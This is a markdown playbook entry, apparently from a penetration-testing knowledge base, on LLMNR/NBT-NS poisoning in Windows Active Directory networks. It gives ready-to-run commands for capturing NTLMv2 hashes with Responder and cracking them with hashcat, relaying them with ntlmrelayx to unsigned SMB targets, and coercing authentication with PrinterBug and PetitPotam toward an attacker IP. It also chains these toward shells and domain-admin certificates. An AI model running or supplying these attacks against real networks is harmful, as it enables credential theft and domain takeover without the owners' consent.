---
id: responder
title: Responder / LLMNR Poisoning
stage: initial-access
tags: [windows, ad, smb]
summary: Poison LLMNR/NBT-NS queries to capture NTLMv2 hashes or relay them to unsigned SMB targets — run immediately on joining any Windows network.
leads_to:
  - ntlm-relay
  - password-spray
  - kerberoast
---

## Prerequisites

On the same network segment as Windows hosts. LLMNR and NBT-NS must not be disabled by GPO (check via responder output — if hashes roll in within minutes, it's working). Start this before doing anything else.

Responder answers broadcast name resolution queries that every Windows machine sends when DNS fails. The machine authenticating leaks its NTLMv2 hash — either crack it offline or relay it to a target with signing disabled. The critical decision is relay vs capture: **if any targets have SMB signing disabled, relay; otherwise capture and crack**.

## Decision: Relay or Capture?

> Check signing status first — this determines which mode to run.

```bash
nxc smb 192.168.x.0/24 --gen-relay-list targets.txt
# targets.txt non-empty → RELAY  (set SMB=Off, HTTP=Off in Responder.conf)
# targets.txt empty     → CAPTURE (leave defaults, crack hashes offline)
```

## Capture Mode

> Defaults on — captures NTLMv2 hashes from all responders, crack offline.

```bash
sudo responder -I tun0 -dwv
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

## Relay Mode

> Turn off SMB/HTTP in Responder so it doesn't answer — let ntlmrelayx do that.

```bash
# Edit Responder.conf: SMB = Off, HTTP = Off
sudo responder -I tun0 -dwv
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

## Coercion Attacks (Force Specific Machine to Authenticate)

> Don't wait for organic traffic — trigger auth from a specific host you need.

```bash
# PrinterBug (requires valid creds + Print Spooler on target)
python3 printerbug.py $DOMAIN/user:password@$TARGET $ATTACKER_IP

# PetitPotam (sometimes unauthenticated)
python3 PetitPotam.py $ATTACKER_IP $TARGET
python3 PetitPotam.py -u user -p password $ATTACKER_IP $TARGET
```

## Leads To

Captured hash cracked → password-spray with the plaintext credential. Unsigned targets present → ntlm-relay for direct shell or ADCS ESC8 relay. Coercing the DC into authenticating → combine with ntlm-relay to ADCS for domain-admin certificate path.
